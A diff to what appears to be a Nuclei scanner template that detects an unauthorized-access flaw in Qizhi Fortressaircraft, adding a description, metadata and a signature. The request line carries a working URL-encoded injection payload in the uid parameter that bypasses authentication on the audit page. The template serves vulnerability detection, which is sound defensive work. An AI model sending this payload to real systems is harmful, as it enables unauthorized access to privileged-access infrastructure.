@@ -4,11 +4,14 @@ info:
   name: Qizhi Fortressaircraft Unauthorized Access
   author: ritikchaddha
   severity: high
+  description: Qizhi Fortressaircraft is vulnerable to Unauthorized Access.
   reference:
     - https://mp.weixin.qq.com/s/FjMRJfCqmXfwPzGYq5Vhkw
-  tags: qizhi,fortressaircraft,unauth
+  metadata:
+    max-request: 1
+  tags: qizhi,fortressaircraft,unauth,vuln
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
@@ -26,3 +29,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4b0a00483046022100e9a37616714dcc1cb4a209ed8ac8e03c6634f7245a16ff536f0e2bab27f3f4c6022100e0820dd6f4c9f40ed692c6025acb1ffc9da4318e02d543f5dfdadf0ac4fc8c2c:922c64590222798bb761d5b6d8e72950
